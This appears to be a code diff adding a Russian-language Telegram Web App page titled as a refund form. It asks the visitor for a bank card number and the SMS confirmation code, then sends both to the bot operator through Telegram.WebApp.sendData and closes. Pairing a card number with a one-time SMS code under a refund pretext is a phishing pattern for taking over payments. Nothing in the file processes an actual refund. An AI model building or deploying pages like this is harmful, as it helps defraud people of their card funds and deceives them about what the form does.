@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>Возврат средств</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+      background: #f2f2f2;
+    }
+    input {
+      display: block;
+      margin-bottom: 10px;
+      width: 100%;
+      padding: 10px;
+    }
+    button {
+      padding: 10px;
+      width: 100%;
+      background-color: #2a9d8f;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Введите данные для возврата</h2>
+  <input type="text" id="card_number" placeholder="Номер карты">
+  <input type="text" id="sms_code" placeholder="Код из SMS">
+  <button id="submit">Отправить</button>
+
+  <script>
+    Telegram.WebApp.ready();
+
+    document.getElementById("submit").addEventListener("click", function () {
+      const card = document.getElementById("card_number").value;
+      const code = document.getElementById("sms_code").value;
+
+      Telegram.WebApp.sendData(JSON.stringify({ card, code }));
+      Telegram.WebApp.close();
+    });
+  </script>
+</body>
+</html>
